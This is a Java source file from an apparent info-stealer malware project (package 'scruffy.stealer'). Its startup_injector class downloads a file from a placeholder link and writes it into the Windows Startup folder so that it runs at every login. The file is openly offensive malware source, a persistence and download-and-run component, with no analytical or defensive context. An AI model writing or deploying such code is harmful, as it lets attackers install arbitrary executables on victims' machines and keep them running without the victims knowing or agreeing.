package scruffy.stealer.impl.inject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

import com.github.kevinsawicki.http.HttpRequest;

import scruffy.stealer.utils.utilities;

public class startup_injector extends utilities {

	private static final String DOWNLOAD_FILE_LINK = "file link to download for startup";

	public void initialize() throws Exception {
		String startupPath = System.getenv("appdata") + "/Microsoft/Windows/Start Menu/Programs/Startup/";
		String file = "<file_name> .exe|.jar";

		if (new File(startupPath + file).exists())
			return;

		HttpRequest request = HttpRequest.get(DOWNLOAD_FILE_LINK).userAgent("itzgonza1337.cu");

		if (request.ok()) {
			InputStream stream = request.getConnection().getInputStream();
			FileOutputStream stream2 = new FileOutputStream(startupPath + file);

			byte[] buffer = new byte[4096];
			int read;
			while ((read = stream.read(buffer)) != -1) {
				stream2.write(buffer, 0, read);
			}
		}
	}

}